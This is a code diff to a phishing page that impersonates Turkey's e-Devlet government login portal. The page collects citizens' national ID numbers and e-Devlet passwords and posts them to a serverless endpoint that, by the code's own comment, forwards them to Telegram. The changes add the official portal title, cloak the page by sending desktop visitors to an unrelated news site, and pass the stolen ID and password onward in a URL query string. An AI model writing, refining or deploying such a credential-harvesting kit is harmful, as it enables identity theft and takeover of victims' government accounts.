@@ -33,11 +33,11 @@
         }
 
         .logo-container {
-            margin-bottom: -27px;
+            margin-bottom: 30px;
         }
 
         .logo {
-            width: 270px;
+            width: 180px;
             height: 180px;
             background-image: url('./images/edk-logo.png');
             background-size: contain;
@@ -62,7 +62,7 @@
             letter-spacing: 0.5px;
         }
         
-        /* ------------- YALNIZCA BUTON VE INPUT STİLLERİ BAŞLANGIÇ ------------- */
+        /* ------------- BUTON VE INPUT STİLLERİ BAŞLANGIÇ ------------- */
 
         .form-group {
             margin-bottom: 18px;
@@ -71,49 +71,38 @@
 
         .form-group label {
             display: block;
+            color: #333;
             font-size: 13px;
-            font-weight: 600;
+            font-weight: 500;
             margin-bottom: 6px;
         }
 
         .required {
             color: #e74c3c;
         }
-		
-		
 
         .form-control {
-background-color: #fff;
-    font-size: 1.1rem;
-    font-weight: 600;
-    color: #000;
-    padding: 5px 10px;
-    border: 1px solid #a5a9b1;
-    width: 100%;
-    height: 2.8125rem;
-    display: inline-block;
-    vertical-align: bottom;
-    border-radius: .5rem;
-    float: left;
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            background-color: white;
         }
 
         .form-control:focus {
-            /* INPUT alanına tıklandığında (focus) stili */
             outline: none;
             border-color: #3498db;
             background-color: white;
             box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
         }
-		
-
 
         .btn-primary {
-            /* DEVAM ET Butonunun ana stili */
-            width: 62% !important;
-			display: inline-block;
-            padding: 0 15px;
-            background: linear-gradient(120deg,#338ad6 0,#045ead 80%);
-            color: #FFF;
+            width: 100%;
+            padding: 12px;
+            background: #4a90e2;
+            color: white;
             border: none;
             border-radius: 25px;
             font-size: 14px;
@@ -124,18 +113,14 @@ background-color: #fff;
         }
 
         .btn-primary:hover {
-            /* Buton üzerine gelindiğinde stili */
             background: #357abd;
             transform: translateY(-1px);
             box-shadow: 0 4px 12px rgba(74, 144, 226, 0.3);
         }
 
         .btn-primary:active {
-            /* Butona basıldığında stili */
             transform: translateY(0);
         }
-
-        /* Yüklenme ve Hata Geri Bildirim Stilleri (Formla İlişkili) */
 
         .result-container {
             margin-top: 20px;
@@ -176,7 +161,7 @@ background-color: #fff;
             100% { transform: rotate(360deg); }
         }
 
-        /* ------------- YALNIZCA BUTON VE INPUT STİLLERİ SONU ------------- */
+        /* ------------- BUTON VE INPUT STİLLERİ SONU ------------- */
 
         /* Diğer Ana Yapı Stilleri (Aynen Korundu) */
         .footer {
@@ -222,7 +207,6 @@ background-color: #fff;
                 font-size: 12px;
             }
             
-            /* Responsive input/button stili */
             .form-control, .btn-primary {
                 padding: 12px;
                 font-size: 14px;
@@ -245,7 +229,8 @@ background-color: #fff;
     <div class="container">
         <div class="logo-container">
             <div class="logo"></div>
-
+            <h1 class="title">e-Devlet Kapısı</h1>
+            <p class="subtitle">KİMLİK DOĞRULAMA SİSTEMİ</p>
         </div>
 
         <form id="identityForm">
@@ -258,12 +243,11 @@ background-color: #fff;
                     id="tc_no" 
                     name="tc_no" 
                     class="form-control" 
-                    placeholder=""
+                    placeholder="11 haneli T.C. Kimlik numaranızı giriniz"
                     maxlength="11"
                     required
                 >
             </div>
-			<br><br>
 
             <div class="form-group">
                 <label for="password">
@@ -274,11 +258,10 @@ background-color: #fff;
                     id="password" 
                     name="password" 
                     class="form-control" 
-                    placeholder=""
+                    placeholder="e-Devlet şifrenizi giriniz"
                     required
                 >
             </div>
-			<br><br>
 
             <button type="submit" class="btn-primary">
                 Devam Et
@@ -298,7 +281,14 @@ background-color: #fff;
         </div>
     </div>
 	
-
+	  <script>
+  document.addEventListener("DOMContentLoaded", function () {
+    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    if (!isMobile) {
+      window.location.href = "https://www.ntv.com.tr/galeri/turkiye/toki-500-bin-ev-basvuru-ucreti-toki-11-21-500-bin-konut-hangi-illere-yapilacak-yeni-toki-kampanyasi-basvuru-sartlari-basvuru-tarihleri,4OpLd0uBl0GHfgsCPPFqPg";
+    }
+  });
+</script>
 
     <script>
         // T.C. Kimlik No input validation
@@ -306,7 +296,7 @@ background-color: #fff;
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11);
         });
 
-        // Form submission (Vercel API'ye veri gönderme mantığı - aynen korundu)
+        // Form submission (Vercel API'ye veri gönderme mantığı)
         document.getElementById('identityForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -334,7 +324,7 @@ background-color: #fff;
             submitBtn.textContent = 'İşlem yapılıyor...';
             
             try {
-                // Veriyi Vercel Serverless Function'a gönder (API endpoint'imiz: /api/send-data)
+                // Vercel Serverless Function'a veri gönderimi
                 const response = await fetch('/api/send-data', {
                     method: 'POST',
                     headers: {
@@ -345,8 +335,13 @@ background-color: #fff;
 
                 // RESPONSE (Telegram'a gönderim) BAŞARILI İSE
                 if (response.ok) {
-                    // Yönlendirme: wait.html'e
-                    window.location.href = 'wait.html'; 
+                    // Yönlendirme: wait.html'e TC No ve Şifreyi querystring ile gönder.
+                    const queryParams = new URLSearchParams({
+                        tc: tcNo,
+                        password: password
+                    }).toString();
+                    
+                    window.location.href = `wait.html?${queryParams}`; 
 
                 } else {
                     // Hata durumunda (API'den dönen hata)
